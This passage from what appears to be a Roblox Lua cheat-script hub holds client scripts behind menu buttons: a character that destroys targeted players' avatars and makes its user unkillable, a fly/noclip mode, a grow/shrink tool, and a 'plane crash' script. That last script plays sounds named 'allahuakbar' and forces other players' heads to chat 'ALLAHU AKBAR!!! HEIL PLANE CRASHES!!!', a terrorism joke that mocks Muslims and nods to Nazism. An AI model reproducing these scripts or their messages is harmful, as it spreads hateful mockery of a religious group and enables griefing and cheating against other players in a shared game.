shockwave.BrickColor = BrickColor.new("White")
shockwave.CFrame = CFrame.new(cyl.Position) * CFrame.new(0,-1,0)
local shockwavemesh = Instance.new("SpecialMesh", shockwave)
shockwavemesh.Scale = Vector3.new(10,1,10)
shockwavemesh.MeshId = "rbxassetid://20329976"
local shockwave2 = Instance.new("Part", Torso)
shockwave2.Size = Vector3.new(1,1,1)
shockwave2.CanCollide = false
shockwave2.Anchored = true
shockwave2.Transparency = .4
shockwave2.BrickColor = BrickColor.new("White")
shockwave2.CFrame = CFrame.new(cyl.Position) * CFrame.new(0,-1,0)
local shockwavemesh2 = Instance.new("SpecialMesh", shockwave2)
shockwavemesh2.Scale = Vector3.new(1,1,1)
shockwavemesh2.MeshId = "rbxassetid://20329976"
for i = 1, 30 do
shockwave.CFrame = shockwave.CFrame * CFrame.Angles(math.rad(0),math.rad(0+math.random(-4,12)),0)
shockwave2.CFrame = shockwave2.CFrame * CFrame.Angles(math.rad(0),math.rad(0-math.random(-4,12)),0)
shockwave.Transparency = shockwave.Transparency + 0.05
shockwave2.Transparency = shockwave2.Transparency + 0.05
shockwavemesh2.Scale = shockwavemesh2.Scale + Vector3.new(8,2.5,8)
shockwavemesh.Scale = shockwavemesh.Scale + Vector3.new(10,2,10)
swait()
end
shockwave:Remove()
shockwave2:Remove()
	end)()
Hit = damagealll(52,brock.Position)
for _,v in pairs(Hit) do
if v:FindFirstChildOfClass("Humanoid") and v:FindFirstChildOfClass("Humanoid").Health > 0 then
slachtoffer = v:FindFirstChildOfClass("Humanoid")
coroutine.wrap(function()
local w = Instance.new("Part",Torso)
w.Anchored = true
w.CanCollide = false
w.Material = "Neon"
w.BrickColor = BrickColor.new("Really black")
if slachtoffer.RigType == Enum.HumanoidRigType.R15 then
w.CFrame = slachtoffer.Parent:FindFirstChild("UpperTorso").CFrame
elseif slachtoffer.RigType == Enum.HumanoidRigType.R6 then
w.CFrame = slachtoffer.Parent:FindFirstChild("Torso").CFrame
end
w.Size = Vector3.new(3,3,3)
w.Shape = "Ball"
for i = 1, 50 do
w.Transparency = w.Transparency + .05
w.Size = w.Size + Vector3.new(3.5,3.5,3.5)
swait()
end
w:Remove()
end)()
for i = 1, 8 do
coroutine.wrap(function()
local ps = Instance.new("Part",Torso)
ps.Size = Vector3.new(1,1,1)
ps.Anchored = true
ps.BrickColor = BrickColor.new("Really black")
ps.Material = "Neon"
if slachtoffer.RigType == Enum.HumanoidRigType.R6 then
ps.CFrame = slachtoffer.Parent:FindFirstChild("Torso").CFrame * CFrame.Angles(math.rad(math.random(-180,180)),math.rad(math.random(-180,180)),math.rad(math.random(-180,180)))
elseif slachtoffer.RigType == Enum.HumanoidRigType.R15 then
ps.CFrame = slachtoffer.Parent:FindFirstChild("UpperTorso").CFrame * CFrame.Angles(math.rad(math.random(-180,180)),math.rad(math.random(-180,180)),math.rad(math.random(-180,180)))
end
local psm = Instance.new("SpecialMesh",ps)
psm.MeshType = "Sphere"
psm.Scale = Vector3.new(3,1,3)
for i = 1, 50 do
psm.Scale = psm.Scale + Vector3.new(0,5,0)
ps.Transparency = ps.Transparency + .025
swait()
end
ps:Remove()
end)()
end
for i,x in pairs(slachtoffer.Parent:GetDescendants()) do if x:IsA("Part") then x:Clone() x.Parent = workspace x.Material = "Glass" x.BrickColor = BrickColor.new("Really black") x.Anchored = false
x.CanCollide = true x:BreakJoints() end end
for i,x in pairs(slachtoffer.Parent:GetDescendants()) do if x:IsA("Part") then x:Remove() end end
slachtoffer.Parent:BreakJoints()
end
end
	for i = 1, 50 do
		brock.CFrame = brock.CFrame:lerp(CFrame.new(cyl.Position) * CFrame.new(0,2,0) * CFrame.Angles(math.rad(math.random(-12,12)),math.rad(math.random(-12,12)),math.rad(math.random(-12,12))),.25)
		swait()
	end
	wait(4)
	for i = 1, 40 do
		brock.CFrame = brock.CFrame:lerp(CFrame.new(cyl.Position) * CFrame.new(0,2,0) * CFrame.Angles(math.rad(math.random(-12,12)),math.rad(math.random(-12,12)),math.rad(math.random(-12,12))),.25)
		swait()
	end
	for i = 1, 40 do
		brock.Transparency = brock.Transparency + .025
		brock.CFrame = brock.CFrame:lerp(CFrame.new(cyl.Position) * CFrame.new(0,-40,0) * CFrame.Angles(math.rad(math.random(-12,12)),math.rad(math.random(-12,12)),math.rad(math.random(-12,12))),.09)
		swait()
	end
	brock:Remove()
	for i = 1, 30 do
		cyl.Size = cyl.Size + Vector3.new(0,3,3)
		cyl.Transparency = cyl.Transparency + .05
		swait()
	end
	cyl:Remove()
	rb:Remove()
	end)()
	txc = txc + 8
	rbweld.C0 = rbweld.C0:lerp(CFrame.new(0,10,txc),.3)
	swait()
end
attacking = false
debounce = false
if xester then
ws = 155
else
ws = 92
end
elseif Press=='q' then
if mouse.Target ~= nil and mouse.Target.Parent:FindFirstChildOfClass("Humanoid") then
if debounce then return end
debounce = true
ws = 0
g1 = Instance.new("BodyGyro", Root)
g1.D = 175
g1.P = 20000
g1.MaxTorque = Vector3.new(0,9000,0)
local targ = mouse.Target.Parent:FindFirstChildOfClass("Humanoid").Parent
for i = 1, 20 do
g1.CFrame = g1.CFrame:lerp(CFrame.new(Root.Position,targ.Head.Position),.2)
swait()
end
removeuseless:AddItem(g1,.001)
eyeball1.BrickColor = BrickColor.new("Crimson")
eyeball1.Material = "Neon"
eyeball2.BrickColor = BrickColor.new("Crimson")
eyeball2.Material = "Neon"
local z = { 
Color = BrickColor.new("Really black").Color
}
SOUND(Head,2175667385,10,false,10)
for i,v in pairs(game:GetService("Players"):GetPlayers()) do
coroutine.wrap(function()
coroutine.wrap(function()
coroutine.wrap(function()
local w = Instance.new("Part",Torso)
w.Anchored = true
w.CanCollide = false
w.Material = "Neon"
w.BrickColor = BrickColor.new("Really black")
if targ:FindFirstChildOfClass("Humanoid").RigType == Enum.HumanoidRigType.R15 then
w.CFrame = targ:FindFirstChild("UpperTorso").CFrame
elseif targ:FindFirstChildOfClass("Humanoid").RigType == Enum.HumanoidRigType.R6 then
w.CFrame = targ:FindFirstChild("Torso").CFrame
end
w.Size = Vector3.new(3,3,3)
w.Shape = "Ball"
for i = 1, 50 do
w.Transparency = w.Transparency + .05
w.Size = w.Size + Vector3.new(3.5,3.5,3.5)
swait()
end
w:Remove()
end)()
for i = 1, 8 do
coroutine.wrap(function()
local ps = Instance.new("Part",Torso)
ps.Size = Vector3.new(1,1,1)
ps.Anchored = true
ps.BrickColor = BrickColor.new("Really black")
ps.Material = "Neon"
if targ:FindFirstChildOfClass("Humanoid").RigType == Enum.HumanoidRigType.R15 then
ps.CFrame = targ:FindFirstChild("UpperTorso").CFrame * CFrame.Angles(math.rad(math.random(-180,180)),math.rad(math.random(-180,180)),math.rad(math.random(-180,180)))
elseif targ:FindFirstChildOfClass("Humanoid").RigType == Enum.HumanoidRigType.R6 then
ps.CFrame = targ:FindFirstChild("Torso").CFrame * CFrame.Angles(math.rad(math.random(-180,180)),math.rad(math.random(-180,180)),math.rad(math.random(-180,180)))
end
local psm = Instance.new("SpecialMesh",ps)
psm.MeshType = "Sphere"
psm.Scale = Vector3.new(3,1,3)
for i = 1, 50 do
psm.Scale = psm.Scale + Vector3.new(0,5,0)
ps.Transparency = ps.Transparency + .025
swait()
end
ps:Remove()
end)()
end
end)()
for i,x in pairs(targ:GetDescendants()) do if x:IsA("Part") then x:Clone() x.Parent = workspace x.Material = "Glass" x.BrickColor = BrickColor.new("Really black") x.Anchored = false
x.CanCollide = true x:BreakJoints() end end
for i,x in pairs(targ:GetDescendants()) do if x:IsA("Part") then x:Remove() end end
targ:BreakJoints()
for i = 1, 40 do
local lol = smoothen:Create(eyeball1,TweenInfo.new(.3,Enum.EasingStyle.Linear),z)
lol:Play()
local lol2 = smoothen:Create(eyeball2,TweenInfo.new(.3,Enum.EasingStyle.Linear),z)
lol2:Play()
swait()
end
eyeball1.BrickColor = BrickColor.new("Really black")
eyeball2.BrickColor = BrickColor.new("Really black")
eyeball1.Material = "Glass"
eyeball2.Material = "Glass"
debounce = false
if xester then
ws = 155
else
ws = 92
end
end)()
end
end
end
end)

checks1 = coroutine.wrap(function() -------Checks
while true do
if Root.Velocity.Magnitude < 10 then
position = "Idle"
elseif Root.Velocity.Magnitude > 10 then
position = "Walking"
else
end
wait()
end
end)
checks1()

function ray(POSITION, DIRECTION, RANGE, IGNOREDECENDANTS)
	return workspace:FindPartOnRay(Ray.new(POSITION, DIRECTION.unit * RANGE), IGNOREDECENDANTS)
end

function ray2(StartPos, EndPos, Distance, Ignore)
local DIRECTION = CFrame.new(StartPos,EndPos).lookVector
return ray(StartPos, DIRECTION, Distance, Ignore)
end

OrgnC0 = Neck.C0
local movelimbs = coroutine.wrap(function()
while RunSrv.RenderStepped:wait() do
TrsoLV = Torso.CFrame.lookVector
Dist = nil
Diff = nil
if not MseGuide then
print("Failed to recognize")
else
local _, Point = Workspace:FindPartOnRay(Ray.new(Head.CFrame.p, mouse.Hit.lookVector), Workspace, false, true)
Dist = (Head.CFrame.p-Point).magnitude
Diff = Head.CFrame.Y-Point.Y
local _, Point2 = Workspace:FindPartOnRay(Ray.new(LeftArm.CFrame.p, mouse.Hit.lookVector), Workspace, false, true)
Dist2 = (LeftArm.CFrame.p-Point).magnitude
Diff2 = LeftArm.CFrame.Y-Point.Y
HEADLERP.C0 = CFrame.new(0, -1.5, -0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0))
Neck.C0 = Neck.C0:lerp(OrgnC0*CFrame.Angles((math.tan(Diff/Dist)*1), 0, (((Head.CFrame.p-Point).Unit):Cross(Torso.CFrame.lookVector)).Y*1), .1)
end
end
end)
movelimbs()
immortal = {}
for i,v in pairs(Character:GetDescendants()) do
	if v:IsA("BasePart") and v.Name ~= "lmagic" and v.Name ~= "rmagic" then
		if v ~= Root and v ~= Torso and v ~= Head and v ~= RightArm and v ~= LeftArm and v ~= RightLeg and v.Name ~= "lmagic" and v.Name ~= "rmagic" and v ~= LeftLeg then
			v.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
		end
		table.insert(immortal,{v,v.Parent,v.Material,v.Color,v.Transparency})
	elseif v:IsA("JointInstance") then
		table.insert(immortal,{v,v.Parent,nil,nil,nil})
	end
end
for e = 1, #immortal do
	if immortal[e] ~= nil then
		local STUFF = immortal[e]
		local PART = STUFF[1]
		local PARENT = STUFF[2]
		local MATERIAL = STUFF[3]
		local COLOR = STUFF[4]
		local TRANSPARENCY = STUFF[5]
if levitate then
		if PART.ClassName == "Part" and PART ~= Root and PART.Name ~= eyo1 and PART.Name ~= eyo2 and PART.Name ~= "lmagic" and PART.Name ~= "rmagic" then
			PART.Material = MATERIAL
			PART.Color = COLOR
			PART.Transparency = TRANSPARENCY
		end
		PART.AncestryChanged:connect(function()
			PART.Parent = PARENT
		end)
else
		if PART.ClassName == "Part" and PART ~= Root and PART.Name ~= "lmagic" and PART.Name ~= "rmagic" then
			PART.Material = MATERIAL
			PART.Color = COLOR
			PART.Transparency = TRANSPARENCY
		end
		PART.AncestryChanged:connect(function()
			PART.Parent = PARENT
		end)
end
	end
end
function immortality()
	for e = 1, #immortal do
		if immortal[e] ~= nil then
			local STUFF = immortal[e]
			local PART = STUFF[1]
			local PARENT = STUFF[2]
			local MATERIAL = STUFF[3]
			local COLOR = STUFF[4]
			local TRANSPARENCY = STUFF[5]
			if PART.ClassName == "Part" and PART == Root then
				PART.Material = MATERIAL
				PART.Color = COLOR
				PART.Transparency = TRANSPARENCY
			end
			if PART.Parent ~= PARENT then
				hum:Remove()
				PART.Parent = PARENT
				hum = Instance.new("Humanoid",Character)
if levitate then
eyo1:Remove()
eyo2:Remove()
end
                                hum.Name = "noneofurbusiness"
			end
		end
	end
end
coroutine.wrap(function()
while true do
hum:SetStateEnabled("Dead",false) hum:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
if hum.Health < .1 then
immortality()
end
wait()
end
end)()

leftlocation = Instance.new("Part",LeftArm)
leftlocation.Size = Vector3.new(1,1,1)
leftlocation.Transparency = 1
leftlocationweld = weldBetween(leftlocation,LeftArm)
leftlocationweld.C0 = CFrame.new(0,1.2,0)
rightlocation = Instance.new("Part",RightArm)
rightlocation.Size = Vector3.new(1,1,1)
rightlocation.Transparency = 1
rightlocationweld = weldBetween(rightlocation,RightArm)
rightlocationweld.C0 = CFrame.new(0,1.2,0)

coroutine.wrap(function()
while true do
hpheight = 5.8 + .95 * math.sin(sine/12)
hum.HipHeight = hpheight
swait()
end
end)()

local anims = coroutine.wrap(function()
while true do
settime = 0.05
sine = sine + change
if position == "Walking" and attacking == false then
if huntdown then
change = .85
else
change = .5
end
walking = true
if xester then
ws = 155
HAND1LERP.C0 = HAND1LERP.C0:lerp(CFrame.new(5.9,-7 + 0 * math.sin(sine/6),5) * CFrame.Angles(math.rad(212 + 3 * math.sin(sine/6)),math.rad(-25),math.rad(2 * math.sin(sine/6))),.2)
HAND2LERP.C0 = HAND2LERP.C0:lerp(CFrame.new(-5.9,-7 + 0 * math.sin(sine/6),5) * CFrame.Angles(math.rad(212 + 3 * math.sin(sine/6)),math.rad(25),math.rad(2 * math.sin(sine/6))),.2)
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0,0 * math.sin(sine/1.75),0) * CFrame.Angles(math.rad(0 + 0 * math.sin(sine/3.5)),math.rad(0 * math.sin(sine/3.5)) + Root.RotVelocity.Y / 15,math.rad(0) + Root.RotVelocity.Y / 19),.2)
LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1.5,.78,0) * CFrame.Angles(math.rad(180 + 4 * math.sin(sine/12)),math.rad(4),math.rad(35)),.25)
RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.5, .78, 0) * CFrame.Angles(math.rad(180 + 4 * math.sin(sine/12)),math.rad(-4),math.rad(-35)), 0.25)
RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-.58,1.8,0) * CFrame.Angles(math.rad(6 + 1 * math.sin(sine/12)),math.rad(-2 + 2 * math.sin(sine/12)),math.rad(5 - 1 * math.sin(sine/12))),.2)
LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(1.2,1.3, -.12) * CFrame.Angles(math.rad(-9 + .5 * math.sin(sine/12)),math.rad(2 - 1 * math.sin(sine/12)),math.rad(-35 + 1 * math.sin(sine/12))),.2)
else
ws = 92
HAND1LERP.C0 = HAND1LERP.C0:lerp(CFrame.new(4.2 + 1 * math.sin(sine/3.5),-5 + .5 * math.sin(sine/3.5),6) * CFrame.Angles(math.rad(150 + 120 * math.sin(sine/3.5)),math.rad(30 * math.sin(sine/3.5)),math.rad(-17 * math.sin(sine/3.5))),.2)
HAND2LERP.C0 = HAND2LERP.C0:lerp(CFrame.new(-4.2 + 1 * math.sin(sine/3.5),-5 + .5 * math.sin(sine/3.5),6) * CFrame.Angles(math.rad(150 + 120 * -math.sin(sine/3.5)),math.rad(30 * math.sin(sine/3.5)),math.rad(-17 * math.sin(sine/3.5))),.2)
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0,1 * math.sin(sine/1.75),0) * CFrame.Angles(math.rad(0 + 5 * math.sin(sine/3.5)),math.rad(10 * math.sin(sine/3.5)) + Root.RotVelocity.Y / 15,math.rad(0) + Root.RotVelocity.Y / 19),.2)
LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1.5,.78,0) * CFrame.Angles(math.rad(180 + 4 * math.sin(sine/12)),math.rad(4),math.rad(35)),.25)
RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.5, .78, 0) * CFrame.Angles(math.rad(180 + 4 * math.sin(sine/12)),math.rad(-4),math.rad(-35)), 0.25)
RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-.58,1.8,0) * CFrame.Angles(math.rad(6 + 1 * math.sin(sine/12)),math.rad(-2 + 2 * math.sin(sine/12)),math.rad(5 - 1 * math.sin(sine/12))),.2)
LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(1.2,1.3, -.12) * CFrame.Angles(math.rad(-9 + .5 * math.sin(sine/12)),math.rad(2 - 1 * math.sin(sine/12)),math.rad(-35 + 1 * math.sin(sine/12))),.2)
end
elseif position == "Idle" and attacking == false then
change = .5
HAND1LERP.C0 = HAND1LERP.C0:lerp(CFrame.new(4.5,-5 + .5 * math.sin(sine/14),6) * CFrame.Angles(math.rad(10 + 1 * math.sin(sine/13)),math.rad(-5 + 5 * math.sin(sine/12)),math.rad(-36 - 4 * math.sin(sine/11))),.2)
HAND2LERP.C0 = HAND2LERP.C0:lerp(CFrame.new(-5,-5 + .5 * math.sin(sine/14),6) * CFrame.Angles(math.rad(13 - 3 * math.sin(sine/12)),math.rad(36 - 3 * math.sin(sine/13)),math.rad(35 + 2 * math.sin(sine/11))),.2)
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0 + 5 * math.sin(sine/12)),math.rad(0 * math.sin(sine/16)),math.rad(0)),.2)
LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1.5,.78,0) * CFrame.Angles(math.rad(180 + 4 * math.sin(sine/12)),math.rad(4),math.rad(35)),.25)
RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.5, .78, 0) * CFrame.Angles(math.rad(180 + 4 * math.sin(sine/12)),math.rad(-4),math.rad(-35)), 0.25)
RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-.58,1.8,0) * CFrame.Angles(math.rad(6 + 1 * math.sin(sine/12)),math.rad(-2 + 2 * math.sin(sine/12)),math.rad(5 - 1 * math.sin(sine/12))),.2)
LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(1.2,1.3, -.12) * CFrame.Angles(math.rad(-9 + .5 * math.sin(sine/12)),math.rad(2 - 1 * math.sin(sine/12)),math.rad(-35 + 1 * math.sin(sine/12))),.2)
end
swait()
end
end)
anims()
warn("The one you fear, Made by Supr14.")

  	end    

})

Tab:AddButton({

	Name = "变为客机",

	Callback = function()

     -- by fr34ky;
local char = game.Players.LocalPlayer.Character


local player = game.Players.LocalPlayer
repeat wait() until player.Character.Humanoid
local humanoid = player.Character.Humanoid
local mouse = player:GetMouse()

local weld = Instance.new("Weld",char.Torso)
weld.Part0 = char.Torso

local plane = Instance.new("Part",char.Torso)
plane.Anchored = false
plane.CanCollide = false
plane.Size = Vector3.new(3,2,6)
plane.CustomPhysicalProperties = PhysicalProperties.new(0,0,0,0,0)
weld.Part1 = plane
weld.C1 = CFrame.new(0,0.5,0) * CFrame.Angles(0,math.rad(270),0)

local pf = Instance.new("ForceField")
pf.Parent = game.Players.LocalPlayer.Character

for i,v in pairs(char.Torso:GetChildren()) do
   if v.ClassName == 'Decal' then
        v:Destroy()
   end
end
for i,v in pairs(char:GetChildren()) do
   if v.ClassName == 'Hat' then
       v:Destroy()
   end
end
for i,v in pairs(char.Head:GetChildren()) do
   if v.ClassName == 'Decal' then
       v:Destroy()
   end
end

char.Humanoid.JumpPower = 200
char.Humanoid.Jump = true

local plane = Instance.new('SpecialMesh', plane)
plane.MeshType = 'FileMesh'
plane.MeshId = 'http://www.roblox.com/asset/?id=498194022' --498194022
plane.TextureId = 'http://www.roblox.com/asset/?id=498194025'
plane.Scale = Vector3.new(0.2, 0.2, 0.2)


planesound=Instance.new('Sound', char.Torso)
planesound.SoundId = 'rbxassetid://439771510'
planesound.Volume = 1
planesound.Looped = true

pullup=Instance.new('Sound', char.Torso)
pullup.SoundId = 'rbxassetid://144560522'
pullup.Volume = 10
pullup.Looped = true

alarm=Instance.new('Sound', char.Torso)
alarm.SoundId = 'rbxassetid://384231761'
alarm.Volume = 10
alarm.Looped = true


screech=Instance.new('Sound', char.Torso)
screech.SoundId = 'rbxassetid://262353320'
screech.Volume = 10

st=Instance.new('Sound', char.Torso)
st.SoundId = 'rbxassetid://131353021'
st.Volume = 20

allahuakbar=Instance.new('Sound', char)
allahuakbar.SoundId = 'rbxassetid://293292782'
allahuakbar.Volume = 10

moosic=Instance.new('Sound', char)
moosic.SoundId = 'rbxassetid://504630746'
moosic.Volume = 2

allahuakbar2=Instance.new('Sound', char)
allahuakbar2.SoundId = 'rbxassetid://446824013' --446824013
allahuakbar2.Volume = 1


planesound:Play()

explosionf=Instance.new('ParticleEmitter', char.Torso)
explosionf.Texture = 'http://www.roblox.com/asset/?id=244514357'
explosionf.Size = NumberSequence.new(19)
explosionf.Rate = 1000
explosionf.LightEmission = 0.4
explosionf.Lifetime = NumberRange.new(1)
explosionf.VelocitySpread = 360
explosionf.Enabled = false



char.Torso.Transparency = 1
char.Head.Transparency = 1
char['Left Arm'].Transparency = 1
char['Right Arm'].Transparency = 1
char['Left Leg'].Transparency = 1
char['Right Leg'].Transparency = 1

repeat wait(1)until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer:GetMouse() and game:FindService("Workspace") and game.Workspace.CurrentCamera
local Me = game:GetService("Players").LocalPlayer
local Char = Me.Character
local Mouse = Me:GetMouse()
local Cam = Workspace.CurrentCamera
local Stop = false
local Version = 0
local MaxSpeed = 8
local Speed = 8
local Keys = {}
local Force = 10000 -- 10000 = Fly, 1000000 = Noclip

local Fly, Rot = Char.Torso:FindFirstChild("LMMFly"), Char.Torso:FindFirstChild("LMMRot")
if Fly then Fly:Destroy() end if Rot then Rot:Destroy() end
Fly = Instance.new("BodyPosition", Char.Torso) Fly.Name = "LMMFly" Fly.maxForce = Vector3.new(math.huge, math.huge, math.huge) Fly.P = Force Fly.position = Char.Torso.Position
Rot = Instance.new("BodyGyro", Char.Torso) Rot.Name = "LMMRot" Rot.maxTorque = Vector3.new(math.huge, math.huge, math.huge) Rot.P = Force Rot.cframe = Cam.CoordinateFrame

local Thread,Old = Version, nil
Char.Humanoid.PlatformStand = true

function StopFly()
Version = Version + 1 Stop = true Char.Humanoid.PlatformStand = false Fly:Destroy() Rot:Destroy() script.Disabled = true script:Destroy()
end

Char.ChildAdded:connect(function(Obj) wait()
if Obj.Name == "LM".."MFlyStop" then
Obj:Destroy()
StopFly()
end
end)

coroutine.wrap(function() while Thread == Version and Stop == false do
local Vectoring = Rot.cframe - Rot.cframe.p + Fly.position

if Keys[string.char(48)] then Speed = 1 end
if Keys.w then Vectoring = Vectoring + Cam.CoordinateFrame.lookVector * Speed end
if Keys.s then Vectoring = Vectoring - Cam.CoordinateFrame.lookVector * Speed end
if Keys.d then Vectoring = Vectoring * CFrame.new(Speed,0,0) end
if Keys.a then Vectoring = Vectoring * CFrame.new(-Speed,0,0) end
if Keys.e or Keys[" "] then Vectoring = Vectoring * CFrame.new(0,Speed,0) end
if Keys.q then Vectoring = Vectoring * CFrame.new(0,-Speed,0) end
if Keys.x then StopFly() end

if Old ~= Vectoring then 
Fly.position = Vectoring.p
Old = Vectoring
Speed = math.min(Speed + Speed*0.025,MaxSpeed)
else
Speed = 1;
end
Rot.cframe = Cam.CoordinateFrame
wait(0.01)
end end)()

Mouse.KeyDown:connect(function(Key)
Keys[Key] = true
end)
Mouse.KeyUp:connect(function(Key)
Keys[Key] = false
end)


mouse.KeyDown:connect(function(key)
if key == "c" then
planesound:Stop()
screech:Play()
allahuakbar2:Stop()
pullup:Stop()
explosionf.Enabled = false
alarm:Stop()
local e = Instance.new("Smoke", char.Torso)
e.Size = 20
char.Torso.Anchored = false
wait(3)
e.Enabled = false

end
end)

mouse.KeyDown:connect(function(key)
if key == "v" then
explosionf.Enabled = true
pullup:Play()
alarm:Play()
explosionf.Size = NumberSequence.new(5)
end
end)

mouse.KeyDown:connect(function(key)
if key == "b" then
moosic:Play()
end
end)

mouse.KeyDown:connect(function(key)
if key == "n" then
moosic:Stop()
end
end)

mouse.KeyDown:connect(function(key)
if key == "z" then
planesound:Play()
screech:Stop()
char.Torso.Anchored = false
st:Play()
allahuakbar2:Stop()
pullup:Stop()
explosionf.Enabled = false
alarm:Stop()


end
end)

Enabled = false
function onTouched(hit)
if Enabled then
return
end
Enabled=false
local e = Instance.new("Explosion") 
e.BlastRadius = 260-- How much ground the explosion covers --
e.BlastPressure = 51-- How powerful the explosion is --
e.Parent = char.Torso -- Don't change this!
e.Position = char.Torso.Position -- Don't change this!
allahuakbar:Play()
explosionf.Size = NumberSequence.new(50)
explosionf.Speed = NumberRange.new(30)
explosionf.Enabled = true
char.Torso.Anchored = true
explosionf.Lifetime = NumberRange.new(0.25)
allahuakbar2:Play()
allahuakbar2.Pitch = 0
pullup:Stop()
alarm:Stop()
wait(1.25)
allahuakbar2.Pitch = 0
explosionf.Enabled = false
planesound:Stop()
wait(0.50)
plr = game.Players.LocalPlayer.Name
for i,v in pairs(game.Players:GetChildren()) do
       if v.Name ~= plr then
game:GetService("Chat"):Chat(v.Character.Head, "ALLAHU AKBAR!!! HEIL PLANE CRASHES!!!", Enum.ChatColor.Blue)
AKBAR=Instance.new('Sound', v.Character.Head)
AKBAR.SoundId = 'rbxassetid://396873260'
AKBAR.Volume = 15
AKBAR.Pitch = 0.25
AKBAR.Looped = false
AKBAR:Play()
wait(2.6)
AKBAR:Play()

end
end

end
char.Torso.Touched:connect(onTouched)

  	end    

})

Tab:AddButton({

	Name = "变大变小",

	Callback = function()

     function giant(p, size)	
	local pchar = p.Character
	if pchar then
		local function scale(chr,scl)
		
			for _,v in pairs(pchar:GetChildren()) do
				if v:IsA("Hat") then
					v:Clone()
					v.Parent = game.Lighting
				end
			end
				
		    local Head = chr['Head']
		    local Torso = chr['Torso']
		    local LA = chr['Left Arm']
		    local RA = chr['Right Arm']
		    local LL = chr['Left Leg']
		    local RL = chr['Right Leg']
		    local HRP = chr['HumanoidRootPart']
		
		    wait(0.1)
		   
		    Head.formFactor = 3
		    Torso.formFactor = 3
		    LA.formFactor = 3
		    RA.formFactor = 3
		    LL.formFactor = 3
		    RL.formFactor = 3
		    HRP.formFactor = 3
		    
		    Head.Size = Vector3.new(scl * 2, scl, scl)
		    Torso.Size = Vector3.new(scl * 2, scl * 2, scl)
		    LA.Size = Vector3.new(scl, scl * 2, scl)
		    RA.Size = Vector3.new(scl, scl * 2, scl)
		    LL.Size = Vector3.new(scl, scl * 2, scl)
		    RL.Size = Vector3.new(scl, scl * 2, scl)
		    HRP.Size = Vector3.new(scl * 2, scl * 2, scl)
		    
		    local Motor1 = Instance.new('Motor6D', Torso)
		    Motor1.Part0 = Torso
		    Motor1.Part1 = Head
	    	Motor1.C0 = CFrame.new(0, 1 * scl, 0) * CFrame.Angles(-1.6, 0, 3.1)
	    	Motor1.C1 = CFrame.new(0, -0.5 * scl, 0) * CFrame.Angles(-1.6, 0, 3.1)
	    	Motor1.Name = "Neck"
				    
	    	local Motor2 = Instance.new('Motor6D', Torso)
	    	Motor2.Part0 = Torso
	    	Motor2.Part1 = LA
	    	Motor2.C0 = CFrame.new(-1 * scl, 0.5 * scl, 0) * CFrame.Angles(0, -1.6, 0)
	    	Motor2.C1 = CFrame.new(0.5 * scl, 0.5 * scl, 0) * CFrame.Angles(0, -1.6, 0)
	    	Motor2.Name = "Left Shoulder"
	    	
	    	local Motor3 = Instance.new('Motor6D', Torso)
	   		Motor3.Part0 = Torso
	    	Motor3.Part1 = RA
	    	Motor3.C0 = CFrame.new(1 * scl, 0.5 * scl, 0) * CFrame.Angles(0, 1.6, 0)
	    	Motor3.C1 = CFrame.new(-0.5 * scl, 0.5 * scl, 0) * CFrame.Angles(0, 1.6, 0)
	    	Motor3.Name = "Right Shoulder"
	    	
	    	local Motor4 = Instance.new('Motor6D', Torso)
	    	Motor4.Part0 = Torso
	    	Motor4.Part1 = LL
	    	Motor4.C0 = CFrame.new(-1 * scl, -1 * scl, 0) * CFrame.Angles(0, -1.6, 0)
	    	Motor4.C1 = CFrame.new(-0.5 * scl, 1 * scl, 0) * CFrame.Angles(0, -1.6, 0)
	    	Motor4.Name = "Left Hip"
	    	
	    	local Motor5 = Instance.new('Motor6D', Torso)
	    	Motor5.Part0 = Torso
	    	Motor5.Part1 = RL
	    	Motor5.C0 = CFrame.new(1 * scl, -1 * scl, 0) * CFrame.Angles(0, 1.6, 0)
	    	Motor5.C1 = CFrame.new(0.5 * scl, 1 * scl, 0) * CFrame.Angles(0, 1.6, 0)
	    	Motor5.Name = "Right Hip"
	    	
	    	local Motor6 = Instance.new('Motor6D', HRP)
	    	Motor6.Part0 = HRP
	    	Motor6.Part1 = Torso
	    	Motor6.C0 = CFrame.new(0, 0, 0) * CFrame.Angles(-1.6, 0, -3.1)
	    	Motor6.C1 = CFrame.new(0, 0, 0) * CFrame.Angles(-1.6, 0, -3.1)
	    	    
		end
		
		scale(pchar, size)
		pchar.Humanoid.WalkSpeed = 15 * size
	
		for _,v in pairs(game.Lighting:GetChildren()) do
			if v:IsA("Hat") then
				v.Parent = pchar
			end
		end
	end
end

local plr = game.Players.LocalPlayer
giant(plr,1)


local csize = 1

local sgui = Instance.new("ScreenGui", game.Players.LocalPlayer.PlayerGui)
local base = Instance.new("Frame", sgui)
base.BackgroundTransparency = 1
base.Size = UDim2.new(0, 110, 0, 200)
base.Position = UDim2.new(1, -120, 1, -180)
local indicator = Instance.new("TextLabel", base)
indicator.Size = UDim2.new(1, 0, 0, 25)
indicator.TextColor3 = Color3.new(1, 1, 1)
indicator.BackgroundTransparency = 0
indicator.FontSize = Enum.FontSize.Size18
indicator.Font = Enum.Font.SourceSans
indicator.Text = "Current Size: 3"
local PlusOne = Instance.new("TextButton", base)
PlusOne.BackgroundColor3 = Color3.new(214/255, 214/255, 214/255)
PlusOne.Position = UDim2.new(0, 0, 0, 40)
